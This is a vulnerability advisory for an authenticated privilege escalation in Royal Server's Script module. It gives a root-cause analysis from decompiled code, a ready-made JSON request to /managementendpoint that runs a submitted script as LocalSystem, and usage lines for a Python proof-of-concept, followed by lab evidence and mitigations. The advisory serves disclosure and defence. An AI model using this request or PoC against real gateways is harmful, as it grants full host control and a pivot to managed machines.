# Royal Server 5.04.50529.0 — Authenticated Local Privilege Escalation to LocalSystem

## 1. Overview

Royal Server 5.04.50529.0 is an enterprise remote-management gateway by Royal Apps GmbH (Austria), built on .NET 10 / ASP.NET Core, installed via Windows MSI. It registers the Windows service `RoyalServer` (Automatic startup, running as **LocalSystem**), listening on 54899/TCP over HTTPS (self-signed certificate). Royal TS and other Royal clients submit management requests — the Script, Processes and Management modules — and the server executes scripts and processes on destination hosts on the client's behalf. This advisory targets the Script module's local execution path.

**Honest conditional framing.** This is a conditional, authenticated privilege-escalation flaw — not an unauthenticated flaw and not a default-credential flaw. An authenticated non-administrator Windows user, whom an administrator has granted the "Royal Server Users" role, submits a script at the management endpoint. When all three preconditions hold, the script executes with the Royal Server service identity — **LocalSystem** — locally on the Royal Server host, instead of in the configured WorkerAccount context:

1. The attacker is an authenticated Windows user added **by an administrator** to the "Royal Server Users" role (the product's design-intended module-access role; not obtained via an authorization flaw).
2. WorkerAccountSettings is **non-empty** (an administrator configured a WorkerAccount; the default is empty, and an empty setting makes the execution wrapper throw before the sink is reached).
3. **psexec.exe is available** on the host (hardcoded PsExec invocation at `oclor.cs:43`; a standard Sysinternals admin tool, common in enterprises, not shipped with the product).

The finding survived a deliberate adversarial refutation pass (Section 7.4), which falsified a CWE-862 "missing authorization" framing — endpoint access in this role is designed behavior — leaving the residual execution-identity defect, CWE-250.

## 2. Vulnerability Summary

- **Type**: Authenticated local privilege escalation to LocalSystem via execution with unnecessary privileges; CWE-250 (primary), CWE-269 (secondary)
- **Root cause**: the local execution path `oclor.fmgvf` spawns its child process **without** setting `ProcessStartInfo` Domain/UserName/Password (the remote path `fmgvg` does set them), so the child inherits the service process token; the WorkerAccount wrapper `ufwmz.ExecuteAs` uses `LogonType.NewCredentials` (9), which only substitutes **outbound network** credentials and never changes the local execution identity
- **Result**: script content submitted by an authenticated "Royal Server Users" member executes as LocalSystem on the Royal Server host
- **CVSS**: 7.2 (High) — CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
- **Explicitly not CWE-862**: "Royal Server Users" is the designed module-access mechanism (Section 3.2); the flaw is the identity the script runs under, not access control

## 3. Authentication & Privilege Boundary

### 3.1 Authentication — delegated to Windows SAM/AD

Authentication is delegated to the host's Windows SAM / Active Directory (`ICredentialValidator` → `LogonUser` Win32 API). There is no self-contained user database, no default credentials, and no backdoor account. Credentials travel in the Basic `Authorization` header, but the password must be encrypted with the product's `IRoyalSecurityInterface.Encrypt(plaintext, useStaticKey=true)`; a plaintext password fails server-side decryption and yields HTTP 500. The unauthenticated angle was ruled out first: all nine anonymously reachable controller endpoints were traced and none reaches an execution sink.

### 3.2 Authorization — two layers

**Controller layer**: `RoyalServerControllerBase` carries only `[Authorize]` (no role restriction), and `ManagementEndpointController` inherits it — any authenticated principal reaches the controller.

```csharp
// RoyalServer/RoyalServer.Controllers/RoyalServerControllerBase.cs
[Authorize]                                    // authentication only, no role restriction
public abstract class RoyalServerControllerBase : Controller
{ }
```

**Global filter layer**: `cqdpa` (an `IAuthorizationFilter`) additionally requires a role claim "WorkerAccount" (resource id 6784) or "Royal Server Users" (1640), otherwise HTTP 403:

```csharp
// cqdpa.cs:68-87  (bemom — the role decision inside the global authorization filter)
private static bool bemom(ClaimsPrincipal vewrc)
{
    IIdentity identity = inqdml.inqdjv(vewrc);
    if (identity == null || !inqdmm.inqdjv(identity)) return false;
    return inqeqj.inqdjv(vewrc).Any(delegate(Claim claim) {
        bool flag = inqeql.inqdjv(inqeox.inqdjv(claim), cqdqj.rsxnl(4879));  // claim.Type == Role
        if (flag) {
            string text = inqeoz.inqdjv(claim);                              // claim.Value
            // 6784 = "WorkerAccount", 1640 = "Royal Server Users"
            return (inqeql.inqdjv(text, cqdqj.rsxnl(6784)) || inqeql.inqdjv(text, cqdqj.rsxnl(1640)));
        }
        return false;
    });
}
```

"Royal Server Users" is the product's **design-intended** module-access role, so a low-privilege member passing `bemom` is expected product behavior, not an authorization bypass:

```csharp
// RoyalServer.Services/GroupConstants.cs
public const string ROYAL_SERVER_USERS = "Royal Server Users";
public const string ROYAL_SERVER_USERS_DESCRIPTION =
    "Members of this group can access the Royal Server Modules";   // by design: "can access the modules"
```

### 3.3 Process boundary

The security-relevant boundary is not "can the user reach the endpoint" (designed: role members can) but **"which identity executes the submitted script"**. That identity is implicitly inherited: the `RoyalServer` service runs as LocalSystem, and the local execution path spawns child processes under the service token.

## 4. Root-Cause Analysis

### 4.1 Method — sink localization through string deobfuscation

The binary stores user-visible strings behind `oclpa.ysdym(int)`; a .NET reflection string dumper resolved the Script-module identifiers: `15535 = "psexec \\{0} -c {1} -e -f -h -n 3 "`, `16194 = "cmd.exe"`, `16250 = "/c "`. All obfuscated names quoted below are genuine decompiler output, kept verbatim.

### 4.2 Two execution paths in the Script-module sink

| Method | Trigger | Command template (deobfuscated) | Credential override | Execution identity |
|--------|---------|--------------------------------|---------------------|--------------------|
| `fmgvf` | request does NOT carry both dest user + dest pass | `cmd.exe /c psexec \\{host} -c {batch} -e -f -h -n 3` | **none** | **service process = LocalSystem** |
| `fmgvg` | request carries both dest user + dest pass | `cmd.exe /c {batch}` | yes (Domain/UserName/Password) | target user |

### 4.3 `fmgvf` — the local path without credential override

```csharp
// oclor.cs — fmgvf (local path, no credential override)
public void fmgvf(string hxvqv, RoyalServerRequest hxvqw, ResponseBuilder hxvqx, string hxvqy)
{
    // ...
    string text2 = xcfjet.xcfjde(oclpa.ysdym(15535), xcfjes.xcfjde(hxvqw), text);
    //  15535 = "psexec \\{0} -c {1} -e -f -h -n 3 " (host, batchfile)  <- hardcoded PsExec call, oclor.cs:43
    ProcessStartInfo processStartInfo = xcfjeu.xcfjde(
        oclpa.ysdym(16194),                        // 16194 = "cmd.exe"
        xcfjep.xcfjde(oclpa.ysdym(16250), text2)); // 16250 = "/c "
    // NOTE: fmgvf does NOT call xcfjfq / xcfjfr / xcfjft (the Domain/UserName/Password
    //       setters) -> ProcessStartInfo carries no credentials -> the child inherits
    //       the service process token = LocalSystem
    xcfjex.xcfjde(processStartInfo, flag2);        // UseShellExecute
    xcfjey.xcfjde(processStartInfo, true);         // RedirectStandardOutput
    xcfjez.xcfjde(processStartInfo, true);         // RedirectStandardError
    xcfjfa.xcfjde(processStartInfo, true);         // CreateNoWindow
    process = xcfjfb.xcfjde(processStartInfo);     // Process.Start -> launched as LocalSystem
    // ...
}
```

### 4.4 `fmgvg` — the remote path with credential override (the contrast that proves the defect)

```csharp
// oclor.cs — fmgvg (remote path, sets target credentials -> executes as the target user)
if (xcfjee.xcfjde(...) > 0 && xcfjee.xcfjde(...) > 0)   // dest user + dest pass both length > 0
{
    xcfjex.xcfjde(processStartInfo, false);
    xcfjfq.xcfjde(processStartInfo, xcfjeh.xcfjde(...));  // <- set Domain
    xcfjfr.xcfjde(processStartInfo, xcfjei.xcfjde(...));  // <- set UserName
    xcfjft.xcfjde(processStartInfo, xcfjfs.xcfjde(...));  // <- set Password   -> executes as the target user
    xcfjfu.xcfjde(processStartInfo, flag);
}
```

The three missing setter calls in `fmgvf` are the root cause: with no destination credentials the script should still run in the WorkerAccount context, but `fmgvf` launches the process chain directly under the service process identity.

### 4.5 WorkerAccount impersonation does not help — `LogonType.NewCredentials` semantics

```csharp
// ufwmz.cs:32  (WorkerAccount impersonation wrapper)
LogonUserResult logonUserResult = lcewws.lcewtz(cyisp, ixnaw, ixnax, LogonType.NewCredentials);
//                                                         ^ NewCredentials = 9 (LOGON32_LOGON_NEW_CREDENTIALS):
//                                                           substitutes outbound network credentials only;
//                                                           local execution keeps the calling process
//                                                           token = RoyalServer service = LocalSystem
```

`LOGON32_LOGON_NEW_CREDENTIALS` clones the token purely for outbound network authentication; the local process — and every child it spawns — continues under the original primary token. Even where the execution path is wrapped in `IImpersonationService.ExecuteAs`, child processes created by `fmgvf` still run as the service account.

### 4.6 The hardcoded PsExec dependency

`oclor.cs:43` builds the command from `"psexec \\{0} -c {1} -e -f -h -n 3 "` — PsExec is a standard Sysinternals tool the product depends on but does not distribute. When present, the local path becomes `cmd.exe /c psexec \\<host> -c <temp-batch>` launched under the service token; PsExec connects to the target machine with the service credentials and starts the batch, and locally that target resolves to the gateway itself.

## 5. Exploit Chain Construction

Chain precondition: an administrator added the attacker's account to the "Royal Server Users" role (the grant is an explicit assumption, not a bypass). The attacker obtains the encrypted form of **their own** account password using the product's own tooling (ConfigurationTool or a Royal client) or a .NET reflection harness calling `IRoyalSecurityInterface.Encrypt(plaintext, true, "")` — the static key is not DPAPI machine-bound.

The HTTP source is the `RoyalServerRequest` posted to `/managementendpoint` — its destination fields are attacker-controllable, and leaving them **empty** selects the local path (the server also auto-fills an empty destination with `localhost`, observed in the response echo):

```csharp
// RoyalServerRequest.cs:44 — destination fields, constructor-initialized to empty strings
public string DestinationHostnames { get; set; }   // empty (not null) by constructor default
public string DestinationUsername { get; set; }
public string DestinationPassword { get; set; }
```

```csharp
// RoyalServer/RoyalServer.Controllers/ManagementEndpointController.cs
[Route("managementendpoint")]
public class ManagementEndpointController : RoyalServerControllerBase   // [Authorize] only
{
    // POST /managementendpoint -> requestHandler processes the RoyalServerRequest
    //   RequestCommand = "ExecuteScript"
    //   RequestArguments.ScriptContent = attacker-controlled script content
    //   DestinationHostnames/Username/Password = attacker-controlled (empty -> fmgvf local path)
}
```

Request construction (proof command writes a `whoami` marker):

```json
POST /managementendpoint
Authorization: Basic base64("lowpriv:<encrypted_password>")
Content-Type: application/json

{
  "ManagementModuleID": "RoyalServer.ManagementEndpoint.Module.Script",
  "RequestCommand": "ExecuteScript",
  "RequestArguments": {
    "ScriptContent": "whoami > C:\\Users\\Public\\royal_marker.txt",
    "ScriptInterpretor": "batch"
  },
  "DestinationHostnames": "",
  "DestinationUsername": "",
  "DestinationPassword": "",
  "EndpointAction": "managementendpoint",
  "EndpointVerb": "post",
  "ContractVersion": 1
}
```

End-to-end data flow:

```
HTTP POST /managementendpoint   (Basic auth: lowpriv:<encrypted password>)
  |
  v
cqdpe.cs  BasicAuth handler  (Base64 decode -> user:encpass -> hxrbd decrypts encpass
  |                           -> LogonUser validation; plaintext -> HTTP 500)
  v
cqdpa.cs  OnAuthorization -> bemom(principal)
  |  lowpriv in "Royal Server Users" (1640) -> bemom = true -> passes (by design)
  v
ManagementEndpointController  ([Authorize] only) -> passes
  |
  v
IRoyalServerRequestHandler -> Script module
  |
  v
oclor.fmgve(stringToExecute, request, builder, options)    <- dispatcher
  |
  |  if (dest user > 0 && dest pass > 0)  -> fmgvg (remote, with credentials, as target user)
  |  else                                 -> fmgvf (local, without credentials, as the service)
  v  (request leaves dest user/pass empty -> else branch)
oclor.fmgvf(...)
  |  text2 = "psexec \\{host} -c {batch} -e -f -h -n 3 "
  |  ProcessStartInfo("cmd.exe", "/c " + text2)   <- no Domain/UserName/Password set
  |  Process.Start()                               <- child inherits the service token = LocalSystem
  v
cmd.exe /c psexec \\<host> -c <temp batch>   (running as LocalSystem)
  |
  v
psexec connects to localhost admin$ with the service (LocalSystem) credentials
  -> the batch executes as LocalSystem
  |
  v
attacker-controlled script content executes locally on the Royal Server host as LocalSystem
```

## 6. PoC Usage

`exploit/royalserver_localsystem_privesc.py` (pure Python standard library, no third-party dependencies):

```sh
# default parameters target the local host and write a whoami marker
python3 exploit/royalserver_localsystem_privesc.py

# custom target, credentials, command
python3 exploit/royalserver_localsystem_privesc.py --target <host> --port 54899 \
    --user <user> --encpass "<encrypted_password>" \
    --cmd "whoami > C:\\Users\\Public\\royal_marker.txt"

# remote run (skip the local marker check, report the HTTP result only)
python3 exploit/royalserver_localsystem_privesc.py --target <host> --no-marker-check
```

- `--encpass` must be the attacker's own account password encrypted with the product static key (Section 5); a plaintext password produces HTTP 500.
- `--marker` defaults to `C:\Users\Public\royal_marker.txt`; the script polls up to 10 seconds and prints the content — `nt authority\system` inside the file proves LocalSystem execution.

## 7. Verification Evidence

### 7.1 Environment (research lab)

| Item | Value |
|------|-------|
| OS | Windows Server 2025 (lab host; IP withheld) |
| Product | Royal Server 5.04.50529.0, service RoyalServer (Automatic, LocalSystem), port 54899 |
| Attacker account | lowpriv — non-admin, member of "Royal Server Users", password submitted encrypted with the product static key |
| WorkerAccount | configured by the administrator (non-default, non-empty) |
| psexec | v2.43 in C:\Windows\System32\ (product hardcodes the call at oclor.cs:43) |

### 7.2 Server response

HTTP 200, `responseState 0`, request ID `1c2ac851-e300-494d-b031-82acc54489a8`. The response echoes `destinationHostnames` as `"localhost"` (auto-filled from the empty request value — the local path was selected) and carries the PsExec banner in the Result table:

```
PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com
```

### 7.3 Target-side marker verification (out-of-band host access)

```
marker path: C:\Users\Public\royal_marker.txt
file exists: YES
size: 21 bytes
last write: 08/02/2026 14:47:48
content (raw): nt authority\system
content (hex): 6e 74 20 61 75 74 68 6f 72 69 74 79 5c 73 79 73 74 65 6d 0d 0a
               = "nt authority\system\r\n"
RoyalServer service StartName: LocalSystem
```

Evidence chain: (1) the non-admin lowpriv request was accepted (HTTP 200); (2) the empty destination was auto-filled to `localhost`, selecting `fmgvf`; (3) the PsExec banner proves the hardcoded launch executed; (4) the marker file was created by the submitted script; (5) its content `nt authority\system` is hex-confirmed, not an encoding artifact; (6) the owning service runs as `StartName=LocalSystem`. The script executed as **LocalSystem** on the Royal Server host — privilege escalation confirmed.

### 7.4 Excluded control paths and adversarial validation

- **Without psexec**: the PsExec invocation fails and the script does not execute (no fallback to a plain local `cmd.exe /c`).
- **ExecutePowershell local Runspace path** (`ocloy.cs:144`): unreachable — `RoyalServerRequest` initializes `DestinationHostnames` to an empty string (not null), so `flag2=true` forces the remote WinRM branch (`ocloy.cs:148-165`), which fails with "Access denied" under WorkerAccount impersonation.
- **Adversarial refutation gate**: an independent refutation pass falsified the CWE-862 framing (role membership is design behavior; the researcher had added lowpriv to the role manually in the lab) while confirming the residual CWE-250/CWE-269 local escalation; a further independent re-analysis graded the finding as a submission-grade conditional privilege escalation. The CWE-862-null result is published as part of the honest scoping of this flaw.

## 8. Security Impact

- **LocalSystem is the highest local Windows privilege** (uid-equivalent of root): full access to the local file system, registry and SAM; ability to install services and persistence and to capture credentials of all local logon sessions.
- **The gateway is a management trust anchor**: it brokers script/process execution toward managed hosts and holds destination connection data. LocalSystem on the gateway enables tampering with management operations, harvesting the destination reach of the deployment, and pivoting toward every host the gateway manages.
- **Vector reflects the preconditions**: network-reachable (AV:N), low privileges required (PR:L, a role-holding authenticated user), but high attack complexity (AC:H) because WorkerAccount must be configured and PsExec present; CIA all High because LocalSystem grants full control of the host.

## 9. Mitigation

1. **Force the credential context on the local path** — `fmgvf` must set WorkerAccount Domain/UserName/Password on `ProcessStartInfo` before `Process.Start`, mirroring `fmgvg`:

```csharp
// fix: set the WorkerAccount credentials before Process.Start (mirroring fmgvg)
xcfjfq.xcfjde(processStartInfo, workerDomain);    // Domain
xcfjfr.xcfjde(processStartInfo, workerUser);      // UserName
xcfjft.xcfjde(processStartInfo, workerPass);      // Password
```

2. **Restrict script execution strictly to the WorkerAccount** — when a request carries no destination credentials, reject it instead of silently degrading to the service process token; the effective execution identity must always be explicit, never implicit token inheritance.
3. **Review the role model** — "Royal Server Users" module access is by design, but whether that role may trigger Script-module execution at all, and under which identity, should be an explicit, separately documented configuration decision.
4. **Correct the impersonation semantics** — `LogonType.NewCredentials` (9) cannot constrain local child processes; WorkerAccount-bounded local execution requires a full logon plus `CreateProcessAsUser`, not an outbound-credentials-only logon.
5. **Defense in depth** — run the `RoyalServer` service under a dedicated low-privilege account (Virtual Account / MSA) instead of LocalSystem, and audit the hardcoded PsExec dependency (`oclor.cs:43`): implement remote execution in-product or ship a vendor-signed copy so the dependency is under vendor control.
